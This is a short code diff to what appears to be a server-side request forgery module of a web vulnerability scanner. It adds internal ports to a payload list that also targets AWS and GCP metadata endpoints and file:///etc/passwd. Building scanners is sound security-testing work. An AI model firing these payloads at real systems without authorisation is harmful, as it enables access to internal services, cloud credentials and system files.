@@ -9,7 +9,6 @@ export default class ModSsrf extends Attack {
     }
 
     async attack(request) {
-        // payloads that try to make the server fetch internal resurces
         const payloads = [
             'http://127.0.0.1/',
             'http://localhost/',
@@ -17,6 +16,8 @@ export default class ModSsrf extends Attack {
             'http://0.0.0.0/',
             'http://127.0.0.1:22/',
             'http://127.0.0.1:3306/',
+            'http://127.0.0.1:3000/', // internal web application port
+            'http://127.0.0.1:8080/',
             'http://169.254.169.254/latest/meta-data/',  // aws metadata
             'http://metadata.google.internal/',           // gcp metadata
             'file:///etc/passwd',
